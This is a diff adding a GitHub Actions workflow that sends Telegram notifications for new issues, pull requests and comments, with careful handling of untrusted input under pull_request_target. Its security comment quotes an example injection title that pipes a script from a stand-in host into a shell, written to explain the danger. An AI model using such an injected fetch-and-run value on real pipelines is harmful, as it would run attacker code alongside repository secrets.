@@ -1,0 +1,122 @@
+name: Notify Telegram
+
+# Pings a Telegram chat when someone else opens an issue or PR, or comments.
+#
+# ─────────────────────────────────────────────────────────────────────────────
+# SECURITY — read before editing.
+#
+# This uses `pull_request_target`, which runs in the context of the BASE repo and
+# therefore has access to repository secrets. That is the only way a fork PR can
+# trigger a notification at all: with plain `pull_request`, secrets are withheld
+# from fork runs, so the Telegram token would be empty and nothing would send.
+#
+# `pull_request_target` is dangerous IF you check out and execute PR code, because
+# untrusted code then runs with your secrets in scope. This workflow therefore:
+#
+#   - has NO actions/checkout step, and must never gain one
+#   - runs no code from the PR
+#   - reads only `github.event` metadata, passed via env rather than interpolated
+#     into the shell (interpolating a PR title directly into `run:` is a script
+#     injection — a title like `"; curl evil.sh | sh; #` would execute)
+#   - requests `permissions: {}` — no token access at all
+#
+# If you ever need to run tests here, do it in test.yml under `pull_request`,
+# never in this file.
+# ─────────────────────────────────────────────────────────────────────────────
+
+on:
+  issues:
+    types: [opened, reopened]
+  pull_request_target:
+    types: [opened, reopened, ready_for_review]
+  issue_comment:
+    types: [created]
+
+permissions: {}
+
+concurrency:
+  group: notify-${{ github.event_name }}-${{ github.event.issue.number || github.event.pull_request.number }}
+  cancel-in-progress: false
+
+jobs:
+  telegram:
+    runs-on: ubuntu-latest
+    # Don't ping the maintainer about their own activity, or about bots.
+    if: >-
+      github.actor != github.repository_owner &&
+      github.event.sender.type != 'Bot'
+    steps:
+      - name: Send Telegram message
+        env:
+          TG_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+          TG_CHAT: ${{ secrets.TELEGRAM_CHAT_ID }}
+          # Everything below is untrusted input — env, never inline interpolation.
+          KIND: ${{ github.event_name }}
+          ACTOR: ${{ github.event.sender.login }}
+          REPO: ${{ github.repository }}
+          NUMBER: ${{ github.event.issue.number || github.event.pull_request.number }}
+          TITLE: ${{ github.event.issue.title || github.event.pull_request.title }}
+          URL: ${{ github.event.issue.html_url || github.event.pull_request.html_url }}
+          COMMENT: ${{ github.event.comment.body }}
+          COMMENT_URL: ${{ github.event.comment.html_url }}
+        run: |
+          set -euo pipefail
+
+          if [ -z "${TG_TOKEN:-}" ] || [ -z "${TG_CHAT:-}" ]; then
+            echo "TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not set — skipping."
+            exit 0
+          fi
+
+          # `export` matters — the python heredoc below is a subprocess and only
+          # sees exported variables. Without it every lookup KeyErrors and nothing sends.
+          case "$KIND" in
+            issues)              export ICON="🐛" WHAT="opened an issue" ;;
+            pull_request_target) export ICON="🔀" WHAT="opened a pull request" ;;
+            issue_comment)       export ICON="💬" WHAT="commented" ;;
+            *)                   export ICON="🔔" WHAT="did something" ;;
+          esac
+
+          export LINK="$URL"
+          export BODY=""
+          if [ "$KIND" = "issue_comment" ]; then
+            export LINK="$COMMENT_URL"
+            export BODY="$(printf '%s' "$COMMENT" | head -c 300)"
+          fi
+
+          # Build the payload with python so the title/comment are JSON-escaped
+          # properly. Shell quoting alone would break on quotes and newlines.
+          python3 - <<'PY' > /tmp/payload.json
+          import html, json, os
+
+          # Telegram's HTML parse_mode allows only a small tag set. An unescaped
+          # "<3" or "<script>" in a title returns 400 "can't parse entities" and the
+          # notification silently never arrives — so escape every untrusted value
+          # and keep only the tags we add ourselves.
+          def esc(value: str, limit: int) -> str:
+              return html.escape(value[:limit], quote=False)
+
+          icon, what = os.environ["ICON"], os.environ["WHAT"]
+          lines = [
+              f'{icon} <b>{esc(os.environ["ACTOR"], 80)}</b> {what}',
+              f'<code>{esc(os.environ["REPO"], 120)}</code> #{esc(os.environ["NUMBER"], 12)}',
+              "",
+              esc(os.environ["TITLE"], 200),
+          ]
+          body = os.environ.get("BODY", "").strip()
+          if body:
+              lines += ["", esc(body, 300)]
+          lines += ["", os.environ["LINK"]]
+          print(json.dumps({
+              "chat_id": os.environ["TG_CHAT"],
+              "text": "\n".join(lines),
+              "parse_mode": "HTML",
+              "disable_web_page_preview": False,
+          }))
+          PY
+
+          curl -sS --fail-with-body --max-time 20 \
+            -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" \
+            -H 'Content-Type: application/json' \
+            -d @/tmp/payload.json > /dev/null
+
+          echo "Notified: $KIND #$NUMBER by $ACTOR"
